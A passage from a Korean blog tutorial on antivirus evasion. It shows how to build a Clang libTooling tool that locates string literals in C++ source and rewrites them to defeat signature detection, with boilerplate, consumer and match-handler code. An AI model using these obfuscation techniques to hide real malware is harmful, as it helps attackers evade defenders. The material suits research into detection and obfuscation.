class="hljs-string">&quot;/usr/lib/clang/8.0.1/&quot;</span>clang -cc1 -ast-dump <span class="hljs-string">&quot;$1&quot;</span> -D <span class="hljs-string">&quot;_WIN64&quot;</span> -D <span class="hljs-string">&quot;_UNICODE&quot;</span> -D <span class="hljs-string">&quot;UNICODE&quot;</span> -D <span class="hljs-string">&quot;_WINSOCK_DEPRECATED_NO_WARNINGS&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH/include&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$CLANG_PATH&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/msvc-14.15.26726-include&quot;</span>\  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/ucrt&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/shared&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/um&quot;</span> \  <span class="hljs-string">&quot;-I&quot;</span> <span class="hljs-string">&quot;$WIN_INCLUDE/Include/10.0.17134.0/winrt&quot;</span> \  <span class="hljs-string">&quot;-fdeprecated-macro&quot;</span> \  <span class="hljs-string">&quot;-w&quot;</span> \  <span class="hljs-string">&quot;-fdebug-compilation-dir&quot;</span>\  <span class="hljs-string">&quot;-fno-use-cxa-atexit&quot;</span> <span class="hljs-string">&quot;-fms-extensions&quot;</span> <span class="hljs-string">&quot;-fms-compatibility&quot;</span> \  <span class="hljs-string">&quot;-fms-compatibility-version=19.15.26726&quot;</span> <span class="hljs-string">&quot;-std=c++14&quot;</span> <span class="hljs-string">&quot;-fdelayed-template-parsing&quot;</span> <span class="hljs-string">&quot;-fobjc-runtime=gcc&quot;</span> <span class="hljs-string">&quot;-fcxx-exceptions&quot;</span> <span class="hljs-string">&quot;-fexceptions&quot;</span> <span class="hljs-string">&quot;-fseh-exceptions&quot;</span> <span class="hljs-string">&quot;-fdiagnostics-show-option&quot;</span> <span class="hljs-string">&quot;-fcolor-diagnostics&quot;</span> <span class="hljs-string">&quot;-x&quot;</span> <span class="hljs-string">&quot;c++&quot;</span></code></pre><p><code>WIN_INCLUDE</code>&#xB294; Win32 API&#xC640; interact &#xD558;&#xAE30; &#xC704;&#xD574; &#xD544;&#xC694;&#xD55C; &#xD5E4;&#xB354;&#xB4E4;&#xC774; &#xC788;&#xB294; &#xD3F4;&#xB354;&#xC774;&#xB2E4;. &#xC708;&#xB3C4;&#xC6B0;10&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC654;&#xC73C;&#xBA70; MinGW&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC624;&#xC9C0; &#xB9D0;&#xACE0; &#xD544;&#xC790;&#xC640; &#xAC19;&#xC740; &#xBC29;&#xBC95;&#xC73C;&#xB85C; &#xD558;&#xB294; &#xAC83;&#xC744; &#xCD94;&#xCC9C;&#xD55C;&#xB2E4;. &#xADF8; &#xD6C4; &#xD14C;&#xC2A4;&#xD2B8; C &#xD30C;&#xC77C;&#xC744; &#xC778;&#xC790;&#xB85C; &#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74; 18MB &#xD30C;&#xC77C;&#xC774; &#xC0DD;&#xC131;&#xB418;&#xC9C0;&#xB9CC; <code>NtMapViewOfSection</code> &#xAC19;&#xC740; &#xC6B0;&#xB9AC;&#xAC00; &#xC120;&#xC5B8;&#xD55C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xAC80;&#xC0C9;&#xD574;&#xC11C; AST&#xC5D0;&#xC11C; &#xBD10;&#xC57C; &#xD560; &#xBD80;&#xBD84;&#xC73C;&#xB85C; &#xC774;&#xB3D9;&#xD560; &#xC218; &#xC788;&#xB2E4;.</p><p><img src="/2020/11/22/idioth/av_evasion_part1/3.png" alt></p><p>AST&#xB97C; &#xC2DC;&#xAC01;&#xD654;&#xD588;&#xC73C;&#xBBC0;&#xB85C; &#xC5B4;&#xB5BB;&#xAC8C; &#xB178;&#xB4DC;&#xB97C; &#xC5C5;&#xB370;&#xC774;&#xD2B8;&#xD574;&#xC57C; &#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC758; syntax &#xC624;&#xB958;&#xAC00; &#xC5C6;&#xC744;&#xC9C0; &#xC54C; &#xC218; &#xC788;&#xB2E4;. &#xB4B7;&#xBD80;&#xBD84;&#xC740; <em>libTooling</em>&#xC744; &#xD1B5;&#xD55C; AST manipulation &#xAD6C;&#xD604;&#xC5D0; &#xB300;&#xD574;&#xC11C; &#xC0C1;&#xC138;&#xD788; &#xB2E4;&#xB8EC;&#xB2E4;.</p><h3 id="ClangTool-boilerplate"><a href="#ClangTool-boilerplate" class="headerlink" title="ClangTool boilerplate"></a>ClangTool boilerplate</h3><p>&#xAD6C;&#xD604;&#xC744; &#xD558;&#xAE30; &#xC804;&#xC5D0; boilerplate &#xCF54;&#xB4DC;&#xAC00; &#xD544;&#xC694;&#xD558;&#xBBC0;&#xB85C; &#xB2E4;&#xC74C; &#xCF54;&#xB4DC;&#xB97C; <code>main.cpp</code>&#xC5D0; &#xC785;&#xB825;&#xD574;&#xB77C;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-comment">// LLVM includes</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;Consumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;iostream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;fstream&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/IncludeStyle.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;clang/Tooling/Inclusions/HeaderIncludes.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;sstream&gt;</span></span><span class="hljs-keyword">namespace</span> ClSetup {    llvm::<span class="hljs-function">cl::OptionCategory <span class="hljs-title">ToolCategory</span><span class="hljs-params">(<span class="hljs-string">&quot;StringEncryptor&quot;</span>)</span></span>;}<span class="hljs-keyword">namespace</span> StringEncryptor {    clang::Rewriter ASTRewriter;    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Action</span> :</span> <span class="hljs-keyword">public</span> clang::ASTFrontendAction {    <span class="hljs-keyword">public</span>:        <span class="hljs-keyword">using</span> ASTConsumerPointer = <span class="hljs-built_in">std</span>::<span class="hljs-built_in">unique_ptr</span>&lt;clang::ASTConsumer&gt;;        <span class="hljs-function">ASTConsumerPointer <span class="hljs-title">CreateASTConsumer</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler,</span></span><span class="hljs-function"><span class="hljs-params">                                             llvm::StringRef Filename)</span> <span class="hljs-keyword">override</span> </span>{            ASTRewriter.setSourceMgr(Compiler.getSourceManager(), Compiler.getLangOpts());            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">vector</span>&lt;ASTConsumer*&gt; consumers;            consumers.push_back(&amp;StringConsumer);              <span class="hljs-comment">// several passes can be combined together by adding them to `consumers`</span>            <span class="hljs-keyword">auto</span> TheConsumer = llvm::make_unique&lt;Consumer&gt;();            TheConsumer-&gt;consumers = consumers;            <span class="hljs-keyword">return</span> TheConsumer;        }        <span class="hljs-function"><span class="hljs-keyword">bool</span> <span class="hljs-title">BeginSourceFileAction</span><span class="hljs-params">(clang::CompilerInstance &amp;Compiler)</span> <span class="hljs-keyword">override</span> </span>{            llvm::outs() &lt;&lt; <span class="hljs-string">&quot;Processing file &quot;</span> &lt;&lt; <span class="hljs-string">&apos;\n&apos;</span>;            <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;        }        <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">EndSourceFileAction</span><span class="hljs-params">()</span> <span class="hljs-keyword">override</span> </span>{            clang::SourceManager &amp;SM = ASTRewriter.getSourceMgr();            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> FileName = SM.getFileEntryForID(SM.getMainFileID())-&gt;getName();            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;** EndSourceFileAction for: &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;            <span class="hljs-comment">// Now emit the rewritten buffer.</span>            llvm::errs() &lt;&lt; <span class="hljs-string">&quot;Here is the edited source file :\n\n&quot;</span>;            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> TypeS;            <span class="hljs-function">llvm::raw_string_ostream <span class="hljs-title">s</span><span class="hljs-params">(TypeS)</span></span>;            <span class="hljs-keyword">auto</span> FileID = SM.getMainFileID();            <span class="hljs-keyword">auto</span> ReWriteBuffer = ASTRewriter.getRewriteBufferFor(FileID);            <span class="hljs-keyword">if</span>(ReWriteBuffer != <span class="hljs-literal">nullptr</span>)                ReWriteBuffer-&gt;write((s));            <span class="hljs-keyword">else</span>{                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;File was not modified\n&quot;</span>;                <span class="hljs-keyword">return</span>;            }            <span class="hljs-built_in">std</span>::<span class="hljs-built_in">string</span> result = s.str();            <span class="hljs-function"><span class="hljs-built_in">std</span>::ofstream <span class="hljs-title">fo</span><span class="hljs-params">(FileName)</span></span>;                   <span class="hljs-keyword">if</span>(fo.is_open())                fo &lt;&lt; result;            <span class="hljs-keyword">else</span>                llvm::errs() &lt;&lt; <span class="hljs-string">&quot;[!] Error saving result to &quot;</span> &lt;&lt; FileName &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;        }    };}auto main(int argc, const char *argv[]) -&gt; int {    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::tooling;    <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> ClSetup;    <span class="hljs-function">CommonOptionsParser <span class="hljs-title">OptionsParser</span><span class="hljs-params">(argc, argv, ToolCategory)</span></span>;    <span class="hljs-function">ClangTool <span class="hljs-title">Tool</span><span class="hljs-params">(OptionsParser.getCompilations(),</span></span><span class="hljs-function"><span class="hljs-params">                   OptionsParser.getSourcePathList())</span></span>;    <span class="hljs-keyword">auto</span> Action = newFrontendActionFactory&lt;StringEncryptor::Action&gt;();    <span class="hljs-keyword">return</span> Tool.run(Action.get());}</code></pre><p>&#xC774; boilerplate &#xCF54;&#xB4DC;&#xB294; &#xACF5;&#xC2DD; &#xBB38;&#xC11C;&#xC5D0;&#xC11C; &#xAC00;&#xC838;&#xC640;&#xC11C; &#xC124;&#xBA85;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;. &#xC5B8;&#xAE09;&#xD560;&#xB9CC;&#xD55C; &#xBCC0;&#xACBD;&#xC810;&#xC740; <code>CreateASTConsumer</code>&#xC774;&#xB2E4;. &#xC6B0;&#xB9AC;&#xC758; &#xBAA9;&#xD45C;&#xB294; &#xAC19;&#xC740; translation unit&#xC5D0;&#xC11C; &#xC5EC;&#xB7EC; transformation pass&#xB97C; &#xC218;&#xD589;&#xD558;&#xB294; &#xAC83;&#xC774;&#xB2E4;. consumers collection(&#xD544;&#xC218; line: <code>consumer.push_back(&amp;...);</code>)&#xC5D0; &#xD56D;&#xBAA9;&#xB4E4;&#xC744; &#xCD94;&#xAC00;&#xD558;&#xBA74; &#xB41C;&#xB2E4;.</p><h2 id="&#xBB38;&#xC790;&#xC5F4;-&#xB09C;&#xB3C5;&#xD654;-1"><a href="#&#xBB38;&#xC790;&#xC5F4;-&#xB09C;&#xB3C5;&#xD654;-1" class="headerlink" title="&#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654;"></a>&#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654;</h2><p>&#xC774; &#xBD80;&#xBD84;&#xC5D0;&#xC11C;&#xB294; &#xC138; &#xAC00;&#xC9C0; &#xB2E8;&#xACC4;&#xB85C; &#xAD6C;&#xC131;&#xB41C; &#xBB38;&#xC790;&#xC5F4; &#xB09C;&#xB3C5;&#xD654; &#xD328;&#xC2A4;&#xC5D0;&#xC11C; &#xAC00;&#xC7A5; &#xC911;&#xC694;&#xD55C; &#xAD6C;&#xD604; &#xC138;&#xBD80; &#xC0AC;&#xD56D;&#xC744; &#xC124;&#xBA85;&#xD55C;&#xB2E4;.</p><ul><li>&#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xCC3E;&#xB294;&#xB2E4;.</li><li>&#xADF8;&#xAC83;&#xB4E4;&#xC744; &#xBCC0;&#xC218;&#xB85C; &#xBCC0;&#xD658;&#xD55C;&#xB2E4;.</li><li>&#xC801;&#xC808;&#xD55C; &#xC704;&#xCE58;(&#xD568;&#xC218; &#xB610;&#xB294; &#xC804;&#xC5ED; context &#xD3EC;&#xD568;)&#xC5D0; &#xBCC0;&#xC218; &#xC815;&#xC758;/&#xD560;&#xB2F9;&#xC744; &#xC0BD;&#xC785;</li></ul><h3 id="&#xC18C;&#xC2A4;-&#xCF54;&#xB4DC;&#xC5D0;&#xC11C;-&#xBB38;&#xC790;&#xC5F4;-&#xB9AC;&#xD130;&#xB7F4;-&#xCC3E;&#xAE30;"><a href="#&#xC18C;&#xC2A4;-&#xCF54;&#xB4DC;&#xC5D0;&#xC11C;-&#xBB38;&#xC790;&#xC5F4;-&#xB9AC;&#xD130;&#xB7F4;-&#xCC3E;&#xAE30;" class="headerlink" title="&#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4; &#xCC3E;&#xAE30;"></a>&#xC18C;&#xC2A4; &#xCF54;&#xB4DC;&#xC5D0;&#xC11C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4; &#xCC3E;&#xAE30;</h3><p><code>StringConsumer</code>&#xB294; &#xC544;&#xB798;&#xC640; &#xAC19;&#xC774; &#xC815;&#xC758;&#xB420; &#xC218; &#xC788;&#xB2E4;.(<code>StringEncryptor</code> namespace&#xC758; &#xC55E;&#xBD80;&#xBD84;)</p><pre><code class="hljs cpp"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">StringEncryptionConsumer</span> :</span> <span class="hljs-keyword">public</span> clang::ASTConsumer {<span class="hljs-keyword">public</span>:    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">HandleTranslationUnit</span><span class="hljs-params">(clang::ASTContext &amp;Context)</span> <span class="hljs-keyword">override</span> </span>{        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang::ast_matchers;        <span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> StringEncryptor;        llvm::outs() &lt;&lt; <span class="hljs-string">&quot;[StringEncryption] Registering ASTMatcher...\n&quot;</span>;        MatchFinder Finder;        <span class="hljs-function">MatchHandler <span class="hljs-title">Handler</span><span class="hljs-params">(&amp;ASTRewriter)</span></span>;        <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> Matcher = stringLiteral().bind(<span class="hljs-string">&quot;decl&quot;</span>);        Finder.addMatcher(Matcher, &amp;Handler);        Finder.matchAST(Context);    }};StringEncryptionConsumer StringConsumer = StringEncryptionConsumer();</code></pre><p>translation unit&#xC774; &#xC788;&#xC73C;&#xBA74; Clang&#xC774; AST&#xC5D0;&#xC11C; &#xD328;&#xD134;&#xC744; &#xCC3E;&#xC744; &#xC218; &#xC788;&#xACE0; &#xCC3E;&#xC744; &#xB54C;&#xB9C8;&#xB2E4; &#xD638;&#xCD9C;&#xB420; &#xD578;&#xB4E4;&#xB7EC;&#xB97C; &#xB4F1;&#xB85D;&#xD560; &#xC218; &#xC788;&#xB2E4;. <a href="https://clang.llvm.org/docs/LibASTMatchersReference.html">ASTMatcher</a>&#xB294; &#xAC15;&#xB825;&#xD55C; &#xD328;&#xD134; &#xB9E4;&#xCE6D;&#xC744; &#xC9C0;&#xC6D0;&#xD558;&#xC9C0;&#xB9CC; &#xC5EC;&#xAE30;&#xC11C;&#xB294; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xB9CC; &#xCC3E;&#xC73C;&#xBBC0;&#xB85C; &#xCDA9;&#xBD84;&#xD788; &#xD65C;&#xC6A9;&#xB418;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.</p><p>&#xC6B0;&#xB9AC;&#xB294; <code>MatchHandler</code>&#xB97C; &#xAD6C;&#xD604;&#xD558;&#xC5EC; &#xBB38;&#xC81C;&#xC758; &#xD575;&#xC2EC;&#xC744; &#xD30C;&#xC545;&#xD560; &#xC218; &#xC788;&#xACE0; <code>MatchResult</code> instance&#xB97C; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC744; &#xAC83;&#xC774;&#xB2E4;. <code>MatchResult</code>&#xB294; &#xC2DD;&#xBCC4;&#xB41C; AST &#xB178;&#xB4DC;&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xC640; &#xC911;&#xC694;&#xD55C; context &#xC815;&#xBCF4;&#xB97C; &#xD3EC;&#xD568;&#xD55C;&#xB2E4;.</p><p>&#xD074;&#xB798;&#xC2A4;&#xB97C; &#xC815;&#xC758;&#xD558;&#xC5EC; <code>clang::ast_matchers::MatchFinder::MatchCallback</code>&#xC73C;&#xB85C;&#xBD80;&#xD130; &#xC88B;&#xC740; stuff&#xB97C; &#xC0C1;&#xC18D;&#xBC1B;&#xC790;.</p><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-meta-keyword">ifndef</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">define</span> AVCLEANER_MATCHHANDLER_H</span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;vector&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;string&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&lt;memory&gt;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/raw_ostream.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/Support/CommandLine.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/StringRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;llvm/ADT/ArrayRef.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Rewrite/Core/Rewriter.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/Tooling.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Tooling/CommonOptionsParser.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/FrontendAction.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Frontend/CompilerInstance.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/Basic/SourceManager.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchers.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/ASTMatchers/ASTMatchFinder.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Type.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/Decl.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTContext.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;clang/AST/ASTConsumer.h&quot;</span></span><span class="hljs-meta">#<span class="hljs-meta-keyword">include</span> <span class="hljs-meta-string">&quot;MatchHandler.h&quot;</span></span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">MatchHandler</span> :</span> <span class="hljs-keyword">public</span> clang::ast_matchers::MatchFinder::MatchCallback {<span class="hljs-keyword">public</span>:    <span class="hljs-keyword">using</span> MatchResult = clang::ast_matchers::MatchFinder::MatchResult;    MatchHandler(clang::Rewriter *rewriter);    <span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> <span class="hljs-keyword">override</span></span>; <span class="hljs-comment">// callback function that runs whenever a Match is found.</span>};<span class="hljs-meta">#<span class="hljs-meta-keyword">endif</span> <span class="hljs-comment">//AVCLEANER_MATCHHANDLER_H</span></span></code></pre><p><code>MatchHandler.cpp</code>&#xC5D0;&#xC11C; <code>MatchHandler</code>&#xC758; &#xC0DD;&#xC131;&#xC790;&#xC640; <code>run</code> &#xCF5C;&#xBC31; &#xD568;&#xC218;&#xB97C; &#xAD6C;&#xD604;&#xD574;&#xC57C; &#xD55C;&#xB2E4;. <code>MatchHandler</code>&#xC758; &#xC0DD;&#xC131;&#xC790;&#xB294; &#xB098;&#xC911;&#xC5D0; &#xC0AC;&#xC6A9;&#xD560; <code>clang::Rewriter</code>&#xC758; instance&#xB9CC; &#xC800;&#xC7A5;&#xD558;&#xBA74; &#xB418;&#xBBC0;&#xB85C; &#xAC04;&#xB2E8;&#xD558;&#xB2E4;.</p><pre><code class="hljs cpp"><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> clang;MatchHandler::MatchHandler(clang::Rewriter *rewriter) {    <span class="hljs-keyword">this</span>-&gt;ASTRewriter = rewriter;}</code></pre><p><code>run</code>&#xC758; &#xAD6C;&#xD604;&#xC740; &#xC544;&#xB798;&#xC640; &#xAC19;&#xB2E4;:</p><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">MatchHandler::run</span><span class="hljs-params">(<span class="hljs-keyword">const</span> MatchResult &amp;Result)</span> </span>{    <span class="hljs-keyword">const</span> <span class="hljs-keyword">auto</span> *Decl = Result.Nodes.getNodeAs&lt;clang::StringLiteral&gt;(<span class="hljs-string">&quot;decl&quot;</span>);    clang::SourceManager &amp;SM = ASTRewriter-&gt;getSourceMgr();    <span class="hljs-comment">// skip strings in included headers</span>    <span class="hljs-keyword">if</span> (!SM.isInMainFile(Decl-&gt;getBeginLoc()))        <span class="hljs-keyword">return</span>;    <span class="hljs-comment">// strings that comprise less than 5 characters are not worth the effort</span>    <span class="hljs-keyword">if</span> (!Decl-&gt;getBytes().str().size() &gt; <span class="hljs-number">4</span>) {        <span class="hljs-keyword">return</span>;    }    climbParentsIgnoreCast(*Decl, clang::ast_type_traits::DynTypedNode(), Result.Context, <span class="hljs-number">0</span>);}</code></pre><p>&#xC704;&#xC5D0;&#xC11C; &#xC9DA;&#xACE0; &#xB118;&#xC5B4;&#xAC08; &#xC138; &#xAC00;&#xC9C0;&#xAC00; &#xC788;&#xB2E4;:</p><ul><li><code>StringEncryptionConsumer</code>&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB41C; &#xD328;&#xD134;&#xACFC; &#xC77C;&#xCE58;&#xD558;&#xB294; AST &#xB178;&#xB4DC;&#xB97C; &#xCD94;&#xCD9C;&#xD55C;&#xB2E4;. &#xADF8;&#xB7EC;&#xAE30; &#xC704;&#xD574;&#xC11C; &#xBC14;&#xC778;&#xB529;&#xB41C; &#xD328;&#xD134; identifier&#xB97C; &#xC778;&#xC790;&#xB85C; &#xBB38;&#xC790;&#xC5F4;&#xC744; &#xC608;&#xC0C1;&#xD558;&#xB294; <code>getNodeAs</code>&#xB97C; &#xD638;&#xCD9C;&#xD560; &#xC218; &#xC788;&#xB2E4;.(<code>const auto Matcher = stringLiteral().bind(&quot;decl&quot;)</code>)</li><li>&#xBD84;&#xC11D; &#xC911;&#xC778; translation unit&#xC5D0;&#xC11C; &#xC815;&#xC758;&#xB418;&#xC9C0; &#xC54A;&#xC740; &#xBB38;&#xC790;&#xC5F4;&#xC740; &#xB118;&#xC5B4;&#xAC04;&#xB2E4;. &#xC2E4;&#xC81C; &#xC6B0;&#xB9AC;&#xAC00; &#xB9CC;&#xB4E0; pass&#xB294; &#xC2DC;&#xC2A4;&#xD15C; &#xD5E4;&#xB354;&#xB97C; translation unit&#xC5D0; &#xBCF5;&#xC0AC;&#xD558;&#xB294; <em>Clang</em>&#xC758; &#xC804;&#xCC98;&#xB9AC;&#xAE30; &#xC774;&#xD6C4;&#xC5D0; &#xC2E4;&#xD589;&#xB41C;&#xB2E4;.</li><li>&#xC774;&#xC81C; &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC744; &#xCC98;&#xB9AC;&#xD560; &#xC900;&#xBE44;&#xAC00; &#xB410;&#xB2E4;. &#xBB38;&#xC790;&#xC5F4; &#xB9AC;&#xD130;&#xB7F4;&#xC774; &#xC5B4;&#xB5A4; context&#xC5D0;&#xC11C; &#xBC1C;&#xACAC;&#xB410;&#xB294;&#xC9C0; &#xC54C;&#xC544;&#xC57C; &#xD558;&#xBBC0;&#xB85C; &#xC0AC;&#xC6A9;&#xC790; &#xC815;&#xC758; &#xD568;&#xC218;&#xC5D0;&#xC11C; &#xCD94;&#xCD9C;&#xB41C; &#xB178;&#xB4DC;(&#xC704;&#xC758; &#xACBD;&#xC6B0; <code>climbParentsIgnoreCase</code>)&#xB97C; AST&#xC5D0; &#xB300;&#xD55C; &#xCC38;&#xC870;&#xB97C; &#xD3EC;&#xD568;&#xD55C; <code>Result.Context</code>&#xB97C; &#xD1B5;&#xD574; &#xC804;&#xB2EC;&#xD55C;&#xB2E4;. &#xBAA9;&#xD45C;&#xB294; &#xD765;&#xBBF8;&#xB85C;&#xC6B4; &#xB178;&#xB4DC;&#xB97C; &#xCC3E;&#xC744; &#xB54C;&#xAE4C;&#xC9C0; &#xC704;&#xCABD;&#xC758; 